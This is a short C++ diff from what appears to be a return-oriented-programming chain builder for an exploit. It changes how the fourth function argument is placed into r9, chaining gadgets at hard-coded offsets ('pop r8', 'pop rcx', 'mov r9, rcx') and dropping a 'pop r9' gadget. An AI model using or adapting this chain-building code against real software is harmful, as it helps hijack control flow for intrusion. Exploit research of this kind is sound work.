@@ -44,6 +44,18 @@ public:
         {
             std::uint64_t ConvertedArgs[] = { static_cast<std::uint64_t>(args)... };
 
+            // Setting up the fourth gadget here, since there is no "pop r9; ret;" gadget universally.
+            // this gadget requires us to set up both r8 and rcx correctly, so we will just do this before
+            // all other args.
+            if (ArgCount >= 4)
+            {
+                this->AddGadget(0x47f82d, "pop r8; ret;");
+                this->AddValue(0, "set r8 to 0");
+                this->AddGadget(0x24cd7b, "pop rcx; ret;");
+                this->AddValue(ConvertedArgs[3], "FourthArg");
+                this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
+            }
+
             if (ArgCount >= 1)
             {
                 this->AddGadget(0x24cd7b, "pop rcx; ret;"); // pop rcx; ret;
@@ -60,12 +72,6 @@ public:
             {
                 this->AddGadget(0x47f82d, "pop r8; ret;"); // pop r8; ret;
                 this->AddValue(ConvertedArgs[2], "ThirdArg");
-            }
-
-            if (ArgCount >= 4)
-            {
-                this->AddGadget(0x6b3323, "pop r9; ret;"); // pop r9; ret;
-                this->AddValue(ConvertedArgs[3], "FourthArg");
             }
         }
 
